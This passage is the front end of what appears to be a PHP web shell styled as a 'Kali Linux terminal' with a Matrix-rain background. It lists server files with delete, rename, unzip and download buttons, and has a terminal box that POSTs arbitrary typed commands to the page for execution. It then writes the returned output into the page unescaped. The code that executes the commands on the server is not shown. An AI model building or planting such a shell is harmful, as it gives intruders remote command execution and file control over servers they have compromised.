                            <button onclick="triggerRenameAction('<?php echo htmlspecialchars($dir['name']); ?>')" class="btn btn-blue">Rename</button>
                            <form method="POST" action="" style="display: inline;" onsubmit="return confirm('Eradicate directory branch?');">
                                <input type="hidden" name="action" value="delete"><input type="hidden" name="item_name" value="<?php echo htmlspecialchars($dir['name']); ?>">
                                <button type="submit" class="btn btn-danger">Delete</button>
                            </form>
                        </td>
                    </tr>
                <?php endforeach; ?>

                <?php foreach ($files as $file): ?>
                    <tr>
                        <td>
                            <?php $icon = getFileIcon($file['ext']); ?>
                            <span style="color: var(--text-color); font-weight: 500;">
                                <?php echo $icon; ?> <?php echo htmlspecialchars($file['name']); ?>
                            </span>
                        </td>
                        <td><?php echo $file['modified']; ?></td><td><?php echo $file['size']; ?></td>
                        <td style="text-align: right; display: flex; gap: 4px; justify-content: flex-end; flex-wrap: wrap;">
                            <?php if ($file['ext'] === 'zip'): ?>
                                <form method="POST" action="" style="display: inline;">
                                    <input type="hidden" name="action" value="unzip_file"><input type="hidden" name="file_name" value="<?php echo htmlspecialchars($file['name']); ?>">
                                    <button type="submit" class="btn" style="border-color: #22c55e; color: #22c55e;">📦 Unzip Here</button>
                                </form>
                            <?php endif; ?>
                            <a href="?dir=<?php echo urlencode($currentPathPointer); ?>&preview=<?php echo urlencode($file['full_path']); ?>" class="btn btn-blue" style="text-decoration: none; border-color: #a855f7; color: #a855f7;">Preview</a>
                            <a href="?dir=<?php echo urlencode($currentPathPointer); ?>&download=<?php echo urlencode($file['name']); ?>" class="btn" style="text-decoration: none;">Download</a>
                            <button onclick="triggerRenameAction('<?php echo htmlspecialchars($file['name']); ?>')" class="btn btn-blue">Rename</button>
                            <form method="POST" action="" style="display: inline;" onsubmit="return confirm('Confirm data erasure?');">
                                <input type="hidden" name="action" value="delete"><input type="hidden" name="item_name" value="<?php echo htmlspecialchars($file['name']); ?>">
                                <button type="submit" class="btn btn-danger">Delete</button>
                            </form>
                        </td>
                    </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>

    <div class="panel">
        <div class="panel-header">
            <h1>[ KALI_LINUX_TERMINAL // LOCALHOST ]</h1>
        </div>
        <div id="kali-terminal">
            <div id="output-stream">Welcome to Kali Linux v2024.1 (bash)</div>
        </div>
        <div style="background:#0c0c0c; padding:10px; display:flex; border-top:1px solid #444;">
            <span style="color:#00ff00; font-weight:bold; margin-right:10px;">root@kali:~$</span>
            <input type="text" id="term-input" class="kali-input" autocomplete="off" autofocus>
        </div>
    </div>
    
    <div style="text-align: center; font-size: 0.65rem; color: var(--text-dim); margin-top: 10px; letter-spacing: 1px;">
        ENVIRONMENT RESYNC OVERHEAD LATENCY: <span style="color: var(--accent-color);"><?php echo round((microtime(true) - START_TIME) * 1000, 2); ?>ms</span>
    </div>
</div>

<script>
// Filename Filter (Client-side)
document.getElementById('fileSearch').addEventListener('keyup', function() {
    let filter = this.value.toLowerCase();
    document.querySelectorAll('#fileTable tbody tr').forEach(row => {
        row.style.display = row.innerText.toLowerCase().includes(filter) ? '' : 'none';
    });
});

// KALI TERMINAL JS
const termInput = document.getElementById('term-input');
const outputStream = document.getElementById('output-stream');
const termBox = document.getElementById('kali-terminal');

termInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        const cmd = termInput.value;
        if (!cmd) return;
        outputStream.innerHTML += `<br><span style="color:#00ff00;">root@kali:~$</span> ${cmd}`;
        termInput.value = '';

        fetch(window.location.href, {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: `action=execute_terminal&command=${encodeURIComponent(cmd)}`
        })
        .then(response => response.text())
        .then(data => {
            outputStream.innerHTML += `<div style="white-space:pre-wrap; color:#ddd; margin-top:5px;">${data}</div>`;
            termBox.scrollTop = termBox.scrollHeight;
        });
    }
});

function triggerRenameAction(oldName) {
    const newName = prompt(`Modify system signature string target for '${oldName}':`, oldName);
    if (newName && newName.trim() !== "" && newName !== oldName) {
        const form = document.createElement('form'); form.method = 'POST'; form.action = '';
        const act = document.createElement('input'); act.type = 'hidden'; act.name = 'action'; act.value = 'rename';
        const oldI = document.createElement('input'); oldI.type = 'hidden'; oldI.name = 'old_name'; oldI.value = oldName;
        const newI = document.createElement('input'); newI.type = 'hidden'; newI.name = 'new_name'; newI.value = newName;
        form.appendChild(act); form.appendChild(oldI); form.appendChild(newI); document.body.appendChild(form); form.submit();
    }
}

const canvas = document.getElementById('matrixBackgroundCanvas');
const ctx = canvas.getContext('2d');

function resizeCanvasMatrix() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
}
resizeCanvasMatrix();
window.addEventListener('resize', resizeCanvasMatrix);

const matrixChars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZｦｧｨｩｪｫｬｭｮｯｰｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋ𓃮𓃯𓃰𓃱";
const charArray = matrixChars.split("");
const fontSize = 14;
let columns = canvas.width / fontSize;
let dropStreams = [];

function initDropStreams() {
    columns = canvas.width / fontSize;
    dropStreams = [];
    for (let x = 0; x < columns; x++) {
        dropStreams[x] = Math.random() * -100;
    }
}
initDropStreams();
window.addEventListener('resize', initDropStreams);

function drawMatrixRainEffect() {
    ctx.fillStyle = "rgba(4, 5, 8, 0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    ctx.font = fontSize + "px monospace";

    for (let i = 0; i < dropStreams.length; i++) {
        if (dropStreams[i] < 0) {
            dropStreams[i]++;
            continue;
        }

        const textChar = charArray[Math.floor(Math.random() * charArray.length)];
        
        if (Math.random() > 0.98) {
            ctx.fillStyle = "#ffffff";
        } else {
            ctx.fillStyle = "rgba(0, 255, 102, 0.75)";
        }

        ctx.fillText(textChar, i * fontSize, dropStreams[i] * fontSize);

        if (dropStreams[i] * fontSize > canvas.height && Math.random() > 0.975) {
            dropStreams[i] = 0;
        }
        dropStreams[i]++;
    }
}
setInterval(drawMatrixRainEffect, 33);
</script>
</body>
</html>